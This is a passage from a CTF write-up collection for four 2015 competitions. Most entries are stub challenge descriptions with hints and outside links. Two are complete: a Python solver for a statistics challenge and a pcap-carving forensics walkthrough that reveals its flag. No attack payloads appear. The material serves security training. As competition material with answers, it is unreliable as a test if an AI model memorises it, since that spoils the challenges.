* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/Warm%20Up/Solution.txt>
# IceCTF 2015: NULL

**Category:** Programming
**Points:** 75
**Description:** 

> We found this [text file](./flag.txt) and we were promised that it contained the flag, but we can't find anything. Those lying cheats!

**Hint:**

> Hmmm... it's not empty, but what's up with the category?

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# IceCTF 2015: Statistics

**Category:** Programming
**Points:** 50
**Description:** 

> Daniel is strangely good at computing statistics in his head, so instead of a password, a program asks him a series of statistics questions for authentication. Let's show him how insecure that is. You can access the server with <code>nc vuln2015.icec.tf 9000</code>.

**Hint:**

> Do you really need to do all these statistics?

## Write-up

by [Nodraak](https://github.com/Nodraak)

A attempt to connect to the serveur with `nc vuln2015.icec.tf 9000` output something like the following :

```bash
$nc vuln2015.icec.tf 9000
886 2777 6915
Gimme the maximum of all the numbers:
```

After a few tries by hand, we can notice that there are four possible operations (minimum, maximum, sum and average), with more and more numbers (up to about 2000 actually). There are 200 round to achieve.

Therefore we need a script to parse the numbers and the operation to perform and then send the answer.

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket

# some settings
TCP_IP = 'vuln2015.icec.tf'
TCP_PORT = 9000
BUFFER_SIZE = 1024


def parse(data):
    """Parse the numbers and the operation to perform from the raw data received"""
    numbers = [int(n) for n in data[0].split()]
    op = data[1].split()[2]
    return numbers, op


def get_data(s):
    """Get all the raw data (it can be longer than BUFFER_SIZE, so we need to loop)"""
    data = ''
    try:
        while 'numbers' not in data:  # try to guess the end of the data
            tmp = s.recv(BUFFER_SIZE)

            if tmp == '':  # no more data and still in the while, we got the flag \o/
                print data
                exit(0)

            data += tmp
    except socket.timeout:
        print 'You have a shitty connection.'
        exit(1)
    return data.split('\n')


def main():
    # connect
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TCP_IP, TCP_PORT))
    s.settimeout(1)

    while True:
        data = get_data(s)
        numbers, action = parse(data)

        print '%s of %d numbers' % (action, len(numbers))

        if action == 'minimum':
            ret = min(numbers)
        elif action == 'maximum':
            ret = max(numbers)
        elif action == 'sum':
            ret = sum(numbers)
        elif action == 'average':
            ret = 1.0 * sum(numbers) / len(numbers)
        else:
            print 'No operation found.'
            exit(1)

        s.send(str(ret)+'\n')


if __name__ == '__main__':
    main()
```

## Other write-ups and resources

* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/Statistics/Solution.py>
# IceCTF 2015 write-ups

* [Website](http://icec.tf/)
* [Scoreboard](scoreboard.json)
* [Wrap-Up (Icelandic)](https://www.youtube.com/watch?v=gqAoCpUfXaI)
* [Some Writeups by the organizers](https://github.com/IceCTF/Problems-2015)

## Completed write-ups

* [binary-exploitation/what](binary-exploitation/what)
* [forensics/document-troubles](forensics/document-troubles)
* [forensics/epilepsy-warning](forensics/epilepsy-warning)
* [forensics/husavik](forensics/husavik)
* [forensics/logoventures](forensics/logoventures)
* [forensics/logoventures-2-reloaded](forensics/logoventures-2-reloaded)
* [forensics/ryan-gooseling](forensics/ryan-gooseling)
* [forensics/scan-me](forensics/scan-me)
* [forensics/sharknado](forensics/sharknado)
* [programming/statistics](programming/statistics)

## External write-ups only

* [binary/fermat](binary/fermat)
* [binary/yee-haw-cowboy](binary/yee-haw-cowboy)
* [binary-exploitation/benders-big-score](binary-exploitation/benders-big-score)
* [binary-exploitation/elevate](binary-exploitation/elevate)
* [binary-exploitation/onions-have-layers](binary-exploitation/onions-have-layers)
* [binary-exploitation/open-sesame](binary-exploitation/open-sesame)
* [binary-exploitation/overflow-1](binary-exploitation/overflow-1)
* [binary-exploitation/overflow-2](binary-exploitation/overflow-2)
* [binary-exploitation/pyshell](binary-exploitation/pyshell)
* [binary-exploitation/shocked](binary-exploitation/shocked)
* [binary-exploitation/simple](binary-exploitation/simple)
* [binary-exploitation/supernote](binary-exploitation/supernote)
* [cryptography/2x0r](cryptography/2x0r)
* [cryptography/agents](cryptography/agents)
* [cryptography/cryptic-crypto](cryptography/cryptic-crypto)
* [cryptography/diary](cryptography/diary)
* [cryptography/entropy](cryptography/entropy)
* [cryptography/farm-animals](cryptography/farm-animals)
* [cryptography/numb3rs](cryptography/numb3rs)
* [cryptography/numeric](cryptography/numeric)
* [cryptography/rot13](cryptography/rot13)
* [cryptography/rsa](cryptography/rsa)
* [cryptography/rsa3](cryptography/rsa3)
* [cryptography/sausages](cryptography/sausages)
* [forensics/alien-contact](forensics/alien-contact)
* [forensics/mondrian](forensics/mondrian)
* [miscellaneous/facebook](miscellaneous/facebook)
* [miscellaneous/not-found](miscellaneous/not-found)
* [miscellaneous/warm-up](miscellaneous/warm-up)
* [web-exploitation/authorize](web-exploitation/authorize)
* [web-exploitation/barista](web-exploitation/barista)
* [web-exploitation/bomb](web-exploitation/bomb)
* [web-exploitation/giffy](web-exploitation/giffy)
* [web-exploitation/giga](web-exploitation/giga)
* [web-exploitation/hackers-in-disguise](web-exploitation/hackers-in-disguise)
* [web-exploitation/injection](web-exploitation/injection)
* [web-exploitation/liar](web-exploitation/liar)
* [web-exploitation/oh-no](web-exploitation/oh-no)
* [web-exploitation/sql-injection-1](web-exploitation/sql-injection-1)
* [web-exploitation/wiki](web-exploitation/wiki)
* [web-exploitation/wiki-and-the-furious](web-exploitation/wiki-and-the-furious)

## Missing write-ups

* [binary/fsociety](binary/fsociety)
* [cryptography/alternate-rsa](cryptography/alternate-rsa)
* [programming/null](programming/null)# IceCTF 2015: Authorize

**Category:** Web Exploitation
**Points:** 120
**Description:** 

> Do you think you can login to the admin account at <a target='_blank' href='http://web2015.icec.tf/authorize'>Evil Corp</a>?

**Hint:**

> Registering is like so 2014!

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.atx.name/icectf/#Authorize>
* <http://73696e65.github.io/blog/2015/08/24/icec-dot-tf-writeup/>
* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/Authorize/Solution.txt>
# IceCTF 2015: Barista

**Category:** Web Exploitation
**Points:** 90
**Description:** 

> Our friend Michael decided to make a barista simulator in CoffeeScript :3. Can you get the secret spice? <a target='_blank' href='http://coffee.icec.tf/'>http://coffee.icec.tf/</a> [source](./coffee.zip).

**Hint:**

> If you open your eyes and look past the visible, what remains?

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.atx.name/icectf/#Barista>
* <http://73696e65.github.io/blog/2015/08/24/icec-dot-tf-writeup/>
* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/Barista/Solution.txt>
# IceCTF 2015: Bomb!

**Category:** Web Exploitation
**Points:** 40
**Description:** 

> We found a bomb!!! It could go off at any minute! We found the control panel for the bomb though, it's <a target='_blank' href='http://web2015.icec.tf/bomb'>here</a>. Can you defuse it?

**Hint:**

> Maybe you could ask it nicely?

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.oleaass.com/ctf-icectf-trivials-writeup/>
* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/Bomb!/Solution.txt>
# IceCTF 2015: Giffy

**Category:** Web Exploitation
**Points:** 60
**Description:** 

> A real hacker must have a good place to store his gifs! We found one such collection <a target='_blank' href='http://web2015.icec.tf/giffy/'>here</a>. Can you try to read <code>flag.txt</code>?

**Hint:**

> A <code>.txt</code> file isn't a GIF :( So why would it be in the same place?

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/Giffy/Solution.txt>
# IceCTF 2015: Giga

**Category:** Web Exploitation
**Points:** 200
**Description:** 

> Here's a gif hosting service. We got word that it contains <code>flag.txt</code> though. Can you get it? <a target='_blank' href='http://giga.icec.tf/'>Giga</a>

**Hint:**

> Go have a look at the authentication code, it seems funky.

## Write-up

(TODO)

## Other write-ups and resources

* <http://security.szurek.pl/icectf-giga-200.html>
* <http://blog.atx.name/icectf/#Giga>
# IceCTF 2015: Hackers in disguise

**Category:** Web Exploitation
**Points:** 80
**Description:** 

> Hackers often don't want to be recognized in public for whatever reason, can you help them find a disguise on this handy <a target='_blank' href='http://disguise.icec.tf/'>site</a>?

**Hint:**

> Making faces is fun, but making shells is more fun

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.atx.name/icectf/#Hackers%20in%20disguise>
* <http://73696e65.github.io/blog/2015/08/24/icec-dot-tf-writeup/>
# IceCTF 2015: Injection

**Category:** Web Exploitation
**Points:** 50
**Description:** 

> I'm just gonna leave <a target='_blank' href='http://web2015.icec.tf/injection'>this</a> here...

**Hint:**

> Can you try to enable debug mode?

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.oleaass.com/ctf-icectf-trivials-writeup/>
* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/Injection/Solution.txt>
# IceCTF 2015: Liar

**Category:** Web Exploitation
**Points:** 30
**Description:** 

> We found this <a target='_blank' href='/problem-static/stage1/web/liar/liar.html'>site</a> which seems to just give you the flag. You wouldn't mind entering it for us, would you?

**Hint:**

> It's not as easy as it seems. Maybe the flag is hidden somewhere? Is it executable?

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/Liar/Solution.txt>
# IceCTF 2015: Oh No!

**Category:** Web Exploitation
**Points:** 20
**Description:** 

> We seem to have misplaced the flag! Sorry about that, but we swear it was left on this <a target=_blank href="/api/autogen/serve/flag.html?static=false&pid=6f256632fcf2f334335d0391eb53ad91">site</a>. Perhaps you can find it?

**Hint:**

> Is it possible that it's there, but you just can't see it?

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.oleaass.com/ctf-icectf-trivials-writeup/>
* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/Oh%20No!/Solution.txt>
# IceCTF 2015: SQL Injection 1

**Category:** Web Exploitation
**Points:** 70
**Description:** 

> I wanna access <a target='_blank' href='http://web2015.icec.tf/injection1'>this</a> page. Don't ask me why... just do it.

**Hint:**

> I feel like the title should be enough :/

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.oleaass.com/ctf-icectf-trivials-writeup/>
* <https://github.com/james9909/PracticeCTF/blob/master/IceCTF-2015/SQL%20Injection%201/Solution.txt>
# IceCTF 2015: Wiki

**Category:** Web Exploitation
**Points:** 90
**Description:** 

> This corporation hid their flag on their <a target='_blank' href='http://wiki.icec.tf'>wiki page</a>. Can you find it?

**Hint:**

> What happens if a wiki page contains HTML?

## Write-up

(TODO)

## Other write-ups and resources

# IceCTF 2015: Wiki & The Furious

**Category:** Web Exploitation
**Points:** 160
**Description:** 

> So, they patched the XSS vulnerability, but added a comment system. The page is here: <a target='_blank' href='http://furious-wiki.icec.tf/'>page</a>. Can you see if you can replay your hack?

**Hint:**

> This is still an XSS problem :3

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.atx.name/icectf/#Wiki%20&%20The%20Furious>
* <http://73696e65.github.io/blog/2015/08/24/icec-dot-tf-writeup/>
# UCSB iCTF 2015: 1337_pizza

**Category:** 1337_Pizza
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: ATM_machine

**Category:** Atm_Machine
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: Bl4ckG0ld

**Category:** Bl4Ckg0Ld
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: debugging_madness

**Category:** Debugging_Madness
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: dungeon

**Category:** Dungeon
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: faust_ticket_registration

**Category:** Faust_Ticket_Registration
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: FHM-Maintenance

**Category:** Fhm-Maintenance
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: Folkswagen_emissions

**Category:** Folkswagen_Emissions
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: gassyliars

**Category:** Gassyliars
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: gdps

**Category:** Gdps
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: hacker_diary

**Category:** Hacker_Diary
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: hanoiFones

**Category:** Hanoifones
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: jokes

**Category:** Jokes
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: killing-as-a-service

**Category:** Killing-As-A-Service
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: monkey-see-monkey-do

**Category:** Monkey-See-Monkey-Do
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: n4w_secrets

**Category:** N4W_Secrets
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: nadmozg

**Category:** Nadmozg
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: notecxx

**Category:** Notecxx
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: pirate_map

**Category:** Pirate_Map
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: poetry

**Category:** Poetry
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015 write-ups

* <https://ictf.cs.ucsb.edu/ictfdata/2015/site/pages/the-2015-ictf.html>
* [Scoreboard](https://ictf.cs.ucsb.edu/ictfdata/2015/scoreboard/#/scores) or [local alternative](./scoreboard)

## Completed write-ups

* none yet

## External write-ups only

* none yet

## Missing write-ups

* [1337_pizza](1337_pizza)
* [ATM_machine](ATM_machine)
* [Bl4ckG0ld](Bl4ckG0ld)
* [debugging_madness](debugging_madness)
* [dungeon](dungeon)
* [faust_ticket_registration](faust_ticket_registration)
* [FHM-Maintenance](FHM-Maintenance)
* [Folkswagen_emissions](Folkswagen_emissions)
* [gassyliars](gassyliars)
* [gdps](gdps)
* [hacker_diary](hacker_diary)
* [hanoiFones](hanoiFones)
* [jokes](jokes)
* [killing-as-a-service](killing-as-a-service)
* [monkey-see-monkey-do](monkey-see-monkey-do)
* [n4w_secrets](n4w_secrets)
* [nadmozg](nadmozg)
* [notecxx](notecxx)
* [pirate_map](pirate_map)
* [poetry](poetry)
* [red_messenger](red_messenger)
* [ropeman](ropeman)
* [rpncalc](rpncalc)
* [santamachine](santamachine)
* [shakespeare](shakespeare)
* [sharing](sharing)
* [simplecalc](simplecalc)
* [syper_service](syper_service)
* [text_file_store](text_file_store)
* [tweety_bird](tweety_bird)
* [ucl_thor](ucl_thor)
* [uss_pirate_service](uss_pirate_service)
* [w0yager](w0yager)
* [wcaaS](wcaaS)
* [Wolfpack_Contact_Book](Wolfpack_Contact_Book)# UCSB iCTF 2015: red_messenger

**Category:** Red_Messenger
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: ropeman

**Category:** Ropeman
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: rpncalc

**Category:** Rpncalc
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: santamachine

**Category:** Santamachine
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: shakespeare

**Category:** Shakespeare
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: sharing

**Category:** Sharing
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: simplecalc

**Category:** Simplecalc
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: syper_service

**Category:** Syper_Service
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: text_file_store

**Category:** Text_File_Store
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: tweety_bird

**Category:** Tweety_Bird
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: ucl_thor

**Category:** Ucl_Thor
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: uss_pirate_service

**Category:** Uss_Pirate_Service
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: w0yager

**Category:** W0Yager
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: wcaaS

**Category:** Wcaas
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# UCSB iCTF 2015: Wolfpack_Contact_Book

**Category:** Wolfpack_Contact_Book
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Inc0gnito CTF 2015: Gaebale-in-panic

**Category: Crypto** 
**Points: 200** 
**Solves:** 
**Description:**

> Gaebale(In Korean, it means "developer") likes developing, so he can't go a day without developing.
> Today, he feels bored, so he trys to make a program.
> The program sends a his game ID, "id420" to server, "211.106.28.2".
> But, he makes a mistake which is to sent other ID to other server.


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Inc0gnito CTF 2015: RSA

**Category: Crypto** 
**Points: 150** 
**Solves:** 
**Description:**

> Decrypt the message written on the image, and find the flag.


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Inc0gnito CTF 2015: WhoAreYou

**Category: Crypto** 
**Points: 200** 
**Solves:** 
**Description:**

> Who are you?


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Inc0gnito CTF 2015: leaks-suspected

**Category: Forensic** 
**Points: 150** 
**Solves:** 
**Description:**

> Alice found that important zip file is leaked by an attacker.
>
> The attacker couldn't delete logs.
>
> Analyze a corrupted pcap file and find the leaked file.


## Write-up

by [polym](https://github.com/abpolym)

We are given a broken pcap, which we can't read with `tshark` or `wireshark`.

Applying `strings` on the data blob, we find some ftp transmission messages:

```bash
$ strings leakage.pcap
EMd@
PORT 192,168,112,133,201,90
200 Port command successful
6Me@
STOR key.zip
150 Opening data channel for file upload to server of "/key.zip"
,Mf@
keyUT
73686b696b7475
keyUT
(Mh@
(Mi@
226 Successfully transferred "/key.zip"
(Mj@
421 Connection timed out.
(NS@
```

Looks like a file named key.zip has been uploaded.

Though we cannot read a broken pcap, we can still extract files inside this pcap using `foremost`:

```bash
$ foremost leakage.pcap 
Processing: leakage.pcap
|foundat=keyUT
*|
$ tree output/
output/
├── audit.txt
└── zip
    └── 00000001.zip

1 directory, 2 files
$ cd output/zip/
$ 7z x 00000001.zip -oout

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=utf8,Utf16=on,HugeFiles=on,8 CPUs)

Processing archive: 00000001.zip

Extracting  key

Everything is Ok

Size:       15
Compressed: 64684
$ cd out
$ cat key
73686b696b7475
```

`key` here is the hexadecimal representation of the final flag, `shkiktu`.


## Other write-ups and resources

* none yet
# Inc0gnito CTF 2015: old_school

**Category: Forensic** 
**Points: 250** 
**Solves:** 
**Description:**

> Find the key


## Write-up

(TODO)

## Other write-ups and resources

* [Korean?](https://protos37.github.io/2015/08/25/inc0gnito-2015-ctf-writeups/)
* [Korean?](http://inc0gnito.com/wordpress/wp-content/uploads/2015/09/Inc0gnitoCTF2015Writeup-Cykor.pdf)
* [Korean?](http://cfile26.uf.tistory.com/attach/250DC14255DC73E20B571F)
# Inc0gnito CTF 2015: POS

**Category: Forensic** 
**Points: 200** 
**Solves:** 
**Description:**

> Victim A is running a restaurant.
> Credit card payment informations are leaked from a POS of the restaurant, and cards are cloned.
> Analyze the evidence to prevent additional card clonning.
> Key is md5(Account name which is injected by hacker_Password which is injected by hacker_Name of malware_Hacker's IP address)


## Write-up

(TODO)

## Other write-ups and resources

* [Korean?](http://inc0gnito.com/wordpress/wp-content/uploads/2015/09/Inc0gnitoCTF2015Writeup-Cykor.pdf)
# Inc0gnito CTF 2015: Hack-a-network-administrator's-terminal

**Category: Network** 
**Points: 250** 
**Solves:** 
**Description:**

> No description


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Inc0gnito CTF 2015: Network-hacking-is-easy

**Category: Network** 
**Points: 150** 
**Solves:** 
**Description:**

> No description


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Inc0gnito CTF 2015: Gameland

**Category: Pwnable** 
**Points: 300** 
**Solves:** 
**Description:**

> Let's play game!


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Inc0gnito CTF 2015: ToDoList

**Category: Pwnable** 
**Points: 500** 
**Solves:** 
**Description:**

> get shell


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/guswns0528/inc0gnito_2015_todolist/blob/master/attack.py>
# Inc0gnito CTF write-ups

* <http://ctf.inc0gnito.com/>
* [Scoreboard](TODO) or [local alternative](./scoreboard)
* [Some writeups in Korean?](http://inc0gnito.com/?p=508)

## Completed write-ups

* [forensic/leaks-suspected](forensic/leaks-suspected)

## External write-ups only

* [forensic/old_school](forensic/old_school)
* [forensic/POS](forensic/POS)
* [pwnable/ToDoList](pwnable/ToDoList)
* [reversing/anti-hexray](reversing/anti-hexray)
* [reversing/CFT](reversing/CFT)
* [reversing/CryptoWorld](reversing/CryptoWorld)
* [reversing/insideout](reversing/insideout)
* [reversing/NTMaze](reversing/NTMaze)
* [reversing/Panic](reversing/Panic)
* [reversing/Reversing](reversing/Reversing)
* [web/ARKANOID](web/ARKANOID)

## Missing write-ups

* [crypto/Gaebale-in-panic](crypto/Gaebale-in-panic)
* [crypto/RSA](crypto/RSA)
* [crypto/WhoAreYou](crypto/WhoAreYou)
* [network/Hack-a-network-administrator's-terminal](network/Hack-a-network-administrator's-terminal)
* [network/Network-hacking-is-easy](network/Network-hacking-is-easy)
* [pwnable/Gameland](pwnable/Gameland)
* [web/OSS](web/OSS)
* [web/Solve-a-problem-with-kakao-friends](web/Solve-a-problem-with-kakao-friends)# Inc0gnito CTF 2015: anti-hexray

**Category: Reversing** 
**Points: 100** 
**Solves:** 
**Description:**

> Find the key


## Write-up

(TODO)

## Other write-ups and resources

* [Korean](http://err0rless313.tistory.com/entry/Inc0gnito-2015-antihexray-exponly)
* [Korean](http://revdev.tistory.com/10)
* [Korean](https://protos37.github.io/2015/08/25/inc0gnito-2015-ctf-writeups/) or <https://gist.github.com/protos37/a8f7e5fe96b616d3dccd>
* [Korean](http://chireluya.tistory.com/30)
* [Korean](http://cfile26.uf.tistory.com/attach/250DC14255DC73E20B571F) (PDF)
* [Korean](http://cfile23.uf.tistory.com/attach/251A083F55F810A216F35A) (PDF)
* [Korean](http://cfile24.uf.tistory.com/attach/2476E04655DC7C6E1C6C0B) (PDF)
# Inc0gnito CTF 2015: CFT

**Category: Reversing** 
**Points: 150** 
**Solves:** 
**Description:**

> Capture Flag The


## Write-up

(TODO)

## Other write-ups and resources

* [Korean](https://protos37.github.io/2015/08/25/inc0gnito-2015-ctf-writeups/) or <https://gist.github.com/protos37/a8f7e5fe96b616d3dccd>
* [Korean](http://inc0gnito.com/wordpress/wp-content/uploads/2015/09/Inc0gnitoCTF2015Writeup-Cykor.pdf) (PDF)
* [Korean](http://cfile24.uf.tistory.com/attach/2476E04655DC7C6E1C6C0B) (PDF)
# Inc0gnito CTF 2015: CryptoWorld

**Category: Reversing** 
**Points: 350** 
**Solves:** 
**Description:**

> There are a server and a client which communicate with symmetric crypto system.
> The server make a random key.
> The client is synchronized with the server, so it know the key.
> The client use the key to decrypt a messages.
> One day, a program ruuning on ther server is leaked by a hacker.
> A administrator of the server think that it's not a threat because the key is random.
> So, he doesn't change a crypto algorithm.
> Decrypt the data which are sent by the server.


## Write-up

(TODO)

## Other write-ups and resources

* [Korean](https://protos37.github.io/2015/08/25/inc0gnito-2015-ctf-writeups/)
* [Korean](http://cfile26.uf.tistory.com/attach/250DC14255DC73E20B571F) (PDF)
# Inc0gnito CTF 2015: insideout

**Category: Reversing** 
**Points: 150** 
**Solves:** 
**Description:**

> Find the flag


## Write-up

(TODO)

## Other write-ups and resources

* [Korean](https://protos37.github.io/2015/08/25/inc0gnito-2015-ctf-writeups/) or <https://gist.github.com/protos37/a8f7e5fe96b616d3dccd>
* [Korean](http://chireluya.tistory.com/27)
* [Korean](http://satanel001.tistory.com/12)
* [Korean](http://cfile26.uf.tistory.com/attach/250DC14255DC73E20B571F) (PDF)
* [Korean](http://cfile24.uf.tistory.com/attach/2476E04655DC7C6E1C6C0B) (PDF)
# Inc0gnito CTF 2015: NTMaze

**Category: Reversing** 
**Points: 300** 
**Solves:** 
**Description:**

> Inc0gnito which encourages to study computer security, make a simple console maze game to make it easier for beginner.
> In the game, escape the maze by using 'wasd'.
> When you are in the maze, you have to collect some bytes.
> When you exit the maze, you can get shell by using the bytes to make a shellcode.
> But, it seems like that you can't get a shell because of the bugs.
> Bypass the bugs to get a shell.


## Write-up

(TODO)

## Other write-ups and resources

* [Korean](http://inc0gnito.com/wordpress/wp-content/uploads/2015/09/Inc0gnitoCTF2015Writeup-Cykor.pdf) (PDF)
# Inc0gnito CTF 2015: Panic

**Category: Reversing** 
**Points: 250** 
**Solves:** 
**Description:**

> Find the key (Use VM)


## Write-up

(TODO)

## Other write-ups and resources

* [Korean](https://protos37.github.io/2015/08/25/inc0gnito-2015-ctf-writeups/) or <https://gist.github.com/protos37/a8f7e5fe96b616d3dccd>
* [Korean](http://inc0gnito.com/wordpress/wp-content/uploads/2015/09/Inc0gnitoCTF2015Writeup-Cykor.pdf) (PDF)
# Inc0gnito CTF 2015: Reversing

**Category: Reversing** 
**Points: 150** 
**Solves:** 
**Description:**

> Find the key


## Write-up

(TODO)

## Other write-ups and resources

* [Korean](https://protos37.github.io/2015/08/25/inc0gnito-2015-ctf-writeups/) or <https://gist.github.com/protos37/a8f7e5fe96b616d3dccd>
* [Korean](http://cfile26.uf.tistory.com/attach/250DC14255DC73E20B571F) (PDF)
* [Korean](http://cfile24.uf.tistory.com/attach/2476E04655DC7C6E1C6C0B) (PDF)
# Inc0gnito CTF 2015: ARKANOID

**Category: Web** 
**Points: 350** 
**Solves:** 
**Description:**

> Find the key


## Write-up

(TODO)

## Other write-ups and resources

* [Korean](http://inc0gnito.com/wordpress/wp-content/uploads/2015/09/ARKANOID_Writeup_Kroot.pdf) (PDF)
# Inc0gnito CTF 2015: OSS

**Category: Web** 
**Points: 250** 
**Solves:** 
**Description:**

> A Web developer, Mr. Kim is a big fan of IU.
> At last month, there is IU concert, but he couldn't go to the concert because he worked late.
> So, he has a big complaint with his boss.
> He just assumes a heavey reponsibility in new project, but he seems like that he has an evil intention.
> Find a vulnerability made by him, and fix it.


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Inc0gnito CTF 2015: Solve-a-problem-with-kakao-friends

**Category: Web** 
**Points: 200** 
**Solves:** 
**Description:**

> Find the key


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Insomni'hack CTF 2015: Jurassic Sparc

**Category:** Exploit
**Solves:** 0
**Description:** 

> Goddamn it, I hate this hacker crap!
> 
> Service running on sparky.insomni.hack:9090 and hutch.insomni.hack:9090
> 
> Download the challenge files here.

## Write-up

(TODO)

## Other write-ups and resources

[http://blog.scrt.ch/2015/03/24/insomnihack-finals-jurassic-sparc-writeup/](http://blog.scrt.ch/2015/03/24/insomnihack-finals-jurassic-sparc-writeup/)
* <http://insomnihack.ch/wp-content/uploads/2016/01/Hacking_like_in_the_movies.pdf># Insomni'hack CTF 2015: mastermind

**Category:** Exploit
**Solves:** 9
**Description:** 

> Seems easy enough!
> Get the UPDATED files here and prepare your joysticks!
> server is at mastermind.insomni.hack:1234

## Write-up

(TODO)

## Other write-ups and resources

* <http://insomnihack.ch/wp-content/uploads/2016/01/Hacking_like_in_the_movies.pdf># Insomni'hack CTF 2015: SH1TTY

**Category:** Exploit
**Solves:** 0
**Description:** 

> Can you write a kernel exploit with your bare hands?
>
> Server: sh1tty.insomni.hack or sh1tty2.insomni.hack
> Port: 22 SSH
> User: sh1tty
> Password: sh1tty
> 
> Download the task files here.

## Write-up

(TODO)

## Other write-ups and resources

[http://blog.scrt.ch/2015/03/24/insomnihack-finals-sh1tty-writeup/](http://blog.scrt.ch/2015/03/24/insomnihack-finals-sh1tty-writeup/)
* <http://insomnihack.ch/wp-content/uploads/2016/01/Hacking_like_in_the_movies.pdf># Insomni'hack CTF 2015: smtpwn

**Category:** Exploit
